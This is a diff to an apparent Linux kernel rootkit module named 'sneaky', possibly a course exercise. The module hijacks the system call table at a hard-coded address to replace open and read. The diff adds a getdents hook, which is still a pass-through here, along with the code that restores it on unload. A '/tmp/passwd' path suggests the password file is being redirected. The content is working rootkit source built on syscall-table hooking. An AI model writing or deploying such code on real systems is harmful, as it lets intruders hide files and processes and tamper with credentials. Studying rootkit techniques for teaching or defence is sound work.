@@ -31,6 +31,13 @@ char* sneaky_path = "/tmp/passwd";
 
 module_param(myPID, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
 
+struct linux_dirent{
+  u64			d_ino;
+  s64			d_off;
+  unsigned short 	d_reclen;
+  char			d_name[];
+};
+
 //These are function pointers to the system calls that change page
 //permissions for the given address (page) to read-only or read-write.
 //Grep for "set_pages_ro" and "set_pages_rw" in:
@@ -50,7 +57,7 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;
 //This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
 asmlinkage int (*original_read)(int fd, char *buf, size_t count);
-
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
@@ -72,6 +79,10 @@ asmlinkage int sneaky_read(int fd, char *buf, size_t count)
   return original_read(fd, buf, count);
 }
 
+asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+{
+  return original_getdents(fd, dirp, count);
+}
 
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -97,6 +108,8 @@ static int initialize_sneaky_module(void)
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
   original_read = (void*)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;
+  original_getdents = (void*)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents; 
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -127,6 +140,8 @@ static void exit_sneaky_module(void)
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
 
   *(sys_call_table + __NR_read) = (unsigned long)original_read;
+
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
